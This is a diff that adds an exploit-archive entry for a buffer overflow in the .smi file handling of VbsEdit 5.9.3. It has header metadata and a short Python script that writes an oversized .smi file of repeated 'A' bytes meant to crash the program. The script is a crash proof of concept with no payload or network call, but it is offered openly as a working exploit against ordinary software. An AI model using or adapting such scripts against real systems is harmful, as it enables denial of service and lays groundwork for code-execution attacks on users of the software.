@@ -1,0 +1,17 @@
+# Exploit Title: VbsEdit 5.9.3(.smi file handling) Buffer overflow vulnerability
+# Date: 22.7.2013
+# Exploit Author: d3b4g
+# Vendor Homepage:http://www.vbsedit.com/
+# Software Link: http://www.vbsedit.com/
+# Tested on: Windows XP SP3
+# Twitter: @schaba
+
+
+
+#!/usr/bin/python
+# Tested on: win XPsp3
+chars = "A"*90000
+crush = "\x41\x41\x41\x41"
+file=open('exp.smi','w')
+file.write(chars+crush+chars)
+file.close()
